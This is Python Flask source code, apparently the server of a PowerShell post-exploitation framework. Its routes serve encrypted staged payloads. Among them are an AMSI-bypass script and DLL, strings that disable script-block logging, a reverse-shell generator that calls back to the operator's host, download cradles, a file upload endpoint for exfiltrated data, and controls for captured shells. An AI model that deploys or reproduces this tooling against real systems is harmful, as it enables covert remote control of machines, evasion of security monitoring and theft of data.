from base64 import b64encode
from datetime import datetime
import logging
import os
import shutil
from tempfile import TemporaryDirectory

from flask import Flask, render_template, request, Response, redirect, \
         send_from_directory, flash, make_response, abort
try:
    from flask_sqlalchemy import SQLAlchemy
except ImportError:
    print("You have unmet dependencies. The clipboard "
          "won't be persistent. Consult the README.")

from werkzeug.serving import WSGIRequestHandler, _log
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_socketio import SocketIO  # , emit

from powerhub.clipboard import init_clipboard
from powerhub.stager import modules, stager_str, callback_url, \
        import_modules, webdav_url
from powerhub.upload import save_file, get_filelist
from powerhub.directories import UPLOAD_DIR, BASE_DIR, XDG_DATA_HOME
from powerhub.tools import encrypt, compress, KEY
from powerhub.auth import requires_auth
from powerhub.repos import repositories, install_repo
from powerhub.obfuscation import symbol_name
from powerhub.receiver import ShellReceiver
from powerhub.args import args
from powerhub.logging import log


_db_filename = os.path.join(XDG_DATA_HOME, "powerhub_db.sqlite")

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1, x_port=1)
app.config.update(
    DEBUG=args.DEBUG,
    SECRET_KEY=os.urandom(16),
    DB_FILENAME=_db_filename,
)
app.config.update(
    SQLALCHEMY_DATABASE_URI='sqlite:///' + app.config["DB_FILENAME"],
    SQLALCHEMY_TRACK_MODIFICATIONS=False,
)
try:
    db = SQLAlchemy(app)
except NameError:
    db = None
cb = init_clipboard(db=db)

socketio = SocketIO(
    app,
    async_mode="threading",
)

if not args.DEBUG:
    logging.getLogger("socketio").setLevel(logging.WARN)
    logging.getLogger("engineio").setLevel(logging.WARN)

need_proxy = True
need_tlsv12 = (args.SSL_KEY is not None)


def push_notification(type, msg, title, subtitle="", **kwargs):
    arguments = {
        'msg': msg,
        'title': title,
        'subtitle': subtitle,
        'type': type,
    }
    arguments.update(dict(**kwargs)),
    socketio.emit('push',
                  arguments,
                  namespace="/push-notifications")


shell_receiver = ShellReceiver(push_notification=push_notification)


class MyRequestHandler(WSGIRequestHandler):
    def address_string(self):
        if 'x-forwarded-for' in dict(self.headers._headers):
            return dict(self.headers._headers)['x-forwarded-for']
        else:
            return self.client_address[0]

    def log(self, type, message, *largs):
        # don't log datetime again
        if " /socket.io/?" not in largs[0] or args.DEBUG:
            _log(type, '%s %s\n' % (self.address_string(), message % largs))


def run_flask_app():
    socketio.run(
        app,
        port=args.FLASK_PORT,
        host='127.0.0.1',
        use_reloader=False,
        request_handler=MyRequestHandler,
    )


@app.template_filter()
def debug(msg):
    if args.DEBUG:
        return msg
    return ""


@app.route('/')
@requires_auth
def index():
    return redirect('/hub')


@app.route('/hub')
@requires_auth
def hub():
    context = {
        "dl_str": stager_str(need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "modules": modules,
        "repositories": list(repositories.keys()),
        "SSL": args.SSL_KEY is not None,
        "AUTH": args.AUTH,
    }
    return render_template("hub.html", **context)


@app.route('/receiver')
@requires_auth
def receiver():
    context = {
        "dl_str": stager_str(flavor='reverse_shell',
                             need_proxy=need_proxy,
                             need_tlsv12=need_tlsv12),
        "SSL": args.SSL_KEY is not None,
        "shells": shell_receiver.active_shells(),
        "AUTH": args.AUTH,
    }
    return render_template("receiver.html", **context)


@app.route('/clipboard')
@requires_auth
def clipboard():
    context = {
        "clipboard": list(cb.entries.values()),
        "AUTH": args.AUTH,
    }
    return render_template("clipboard.html", **context)


@app.route('/fileexchange')
@requires_auth
def fileexchange():
    context = {
        "files": get_filelist(),
        "AUTH": args.AUTH,
    }
    return render_template("fileexchange.html", **context)


@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('static/css', path)


@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('static/js', path)


@app.route('/img/<path:path>')
def send_img(path):
    return send_from_directory('static/img', path)


@app.route('/clipboard/add', methods=["POST"])
@requires_auth
def add_clipboard():
    """Add a clipboard entry"""
    content = request.form.get("content")
    cb.add(
        content,
        str(datetime.utcnow()).split('.')[0],
        request.remote_addr
    )
    push_notification("reload", "Update Clipboard", "")
    return redirect('/clipboard')


@app.route('/clipboard/delete', methods=["POST"])
@requires_auth
def del_clipboard():
    """Delete a clipboard entry"""
    id = int(request.form.get("id"))
    cb.delete(id)
    return ""


@app.route('/clipboard/del-all', methods=["POST"])
@requires_auth
def del_all_clipboard():
    """Delete all clipboard entries"""
    for id in list(cb.entries.keys()):
        cb.delete(id)
    return ""


@app.route('/clipboard/export', methods=["GET"])
@requires_auth
def export_clipboard():
    """Export all clipboard entries"""
    result = ""
    for e in list(cb.entries.values()):
        headline = "%s (%s)\r\n" % (e.time, e.IP)
        result += headline
        result += "="*(len(headline)-2) + "\r\n"
        result += e.content + "\r\n"*2
    return Response(
        result,
        content_type='text/plain; charset=utf-8'
    )


@app.route('/m')
def payload_m():
    """Load a single module"""
    if 'm' not in request.args:
        return Response('error')
    n = int(request.args.get('m'))
    if n < len(modules):
        modules[n].activate()
        if 'c' in request.args:
            resp = b64encode(encrypt(compress(modules[n].code), KEY)),
        else:
            resp = b64encode(encrypt(modules[n].code, KEY)),
        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")


@app.route('/0')
def payload_0():
    """Load 0th stage"""
    encrypted_strings = [
        "Bypass.AMSI",
        "System.Management.Automation.Utils",
        "cachedGroupPolicySettings",
        "NonPublic,Static",
        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
        "EnableScriptBlockLogging",
    ]
    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                         in encrypted_strings]
    context = {
        "modules": modules,
        "callback_url": callback_url,
        "key": KEY,
        "strings": encrypted_strings,
        "symbol_name": symbol_name,
        "stage2": 'r' if 'r' in request.args else '1',
    }
    result = render_template(
                    "amsi.ps1",
                    **context,
                    content_type='text/plain'
    )
    return result


@app.route('/1')
def payload_1():
    """Load 1st stage"""
    context = {
        "modules": modules,
        "webdav_url": webdav_url,
        "symbol_name": symbol_name,
    }
    result = render_template(
                    "payload.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/l')
def payload_l():
    """Load the AMSI Bypass DLL"""
    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa

    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
    with open(filename, 'rb') as f:
        DLL = f.read()
    DLL = b64encode(encrypt(b64encode(DLL), KEY))
    return Response(DLL, content_type='text/plain; charset=utf-8')


@app.route('/dlcradle')
def dlcradle():
    global need_proxy, need_tlsv12
    need_proxy = request.args['proxy'] == 'true'
    need_tlsv12 = request.args['tlsv12'] == 'true'
    return stager_str(need_proxy=need_proxy, need_tlsv12=need_tlsv12)


@app.route('/u', methods=["POST"])
def upload():
    """Upload one or more files"""
    file_list = request.files.getlist("file[]")
    noredirect = "noredirect" in request.args
    for file in file_list:
        if file.filename == '':
            return redirect(request.url)
        if file:
            save_file(file)
    push_notification("reload", "Update Fileexchange", "")
    if noredirect:
        return ('OK', 200)
    else:
        return redirect('/fileexchange')


@app.route('/d/<path:filename>')
@requires_auth
def download_file(filename):
    """Download a file"""
    try:
        return send_from_directory(UPLOAD_DIR,
                                   filename,
                                   as_attachment=True)
    except PermissionError:
        abort(403)


@app.route('/d-all')
@requires_auth
def download_all():
    """Download archive of all uploaded files"""
    tmp_dir = TemporaryDirectory()
    file_name = "powerhub_upload_export_" + \
                datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    shutil.make_archive(os.path.join(tmp_dir.name, file_name),
                        "zip",
                        UPLOAD_DIR)
    return send_from_directory(tmp_dir.name,
                               file_name + ".zip",
                               as_attachment=True)


@app.route('/getrepo', methods=["POST"])
@requires_auth
def get_repo():
    """Download a specified repository"""
    msg, msg_type = install_repo(
        request.form['repo'],
        request.form['custom-repo']
    )
    # possible types: success, info, danger, warning
    flash(msg, msg_type)
    return redirect('/hub')


@app.route('/reload', methods=["POST"])
@requires_auth
def reload_modules():
    """Reload all modules from disk"""
    try:
        global modules
        modules = import_modules()
        flash("Modules reloaded (press F5 to see them)", "success")
    except Exception as e:
        flash("Error while reloading modules: %s" % str(e), "danger")
    return render_template("messages.html")


@app.route('/r', methods=["GET"])
def reverse_shell():
    """Spawn a reverse shell"""
    context = {
        "dl_cradle": stager_str().replace('$K', '$R'),
        "IP": args.URI_HOST,
        "delay": 10,  # delay in seconds
        "lifetime": 3,  # lifetime in days
        "PORT": str(args.REC_PORT),
        "key": KEY,
    }
    result = render_template(
                    "reverse-shell.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/shell-log', methods=["GET"])
def shell_log():
    shell_id = request.args['id']
    if 'content' in request.args:
        content = request.args['content']
    else:
        content = 'html'
    shell = shell_receiver.get_shell_by_id(shell_id)
    log = shell.get_log()
    context = {
        'log': log,
        'content': content,
    }
    if content == 'html':
        return render_template("shell-log.html", **context)
    elif content == 'raw':
        response = make_response(render_template("shell-log.html",
                                 **context))
        response.headers['Content-Disposition'] = \
            'attachment; filename=' + shell_id + ".log"
        response.headers['content-type'] = 'text/plain; charset=utf-8'
        return response


@app.route('/kill-shell', methods=["POST"])
def shell_kill():
    shell_id = request.form.get("shellid")
    shell = shell_receiver.get_shell_by_id(shell_id)
    shell.kill()
    return ""


@app.route('/forget-shell', methods=["POST"])
def shell_forget():
    shell_id = request.form.get("shellid")
    shell_receiver.forget_shell(shell_id)
    return ""


@app.route('/kill-all', methods=["POST"])
def shell_kill_all():
    for shell in shell_receiver.active_shells():
        shell.kill()
    return ""


@app.route('/receiver/shellcard', methods=["GET"])
def shell_card():
    shell_id = request.args["shell-id"]
    shell = shell_receiver.get_shell_by_id(shell_id)
    return render_template("receiver-shellcard.html", s=shell)


@socketio.on('connect', namespace="/push-notifications")
def test_connect():
    log.debug("Websockt client connected")
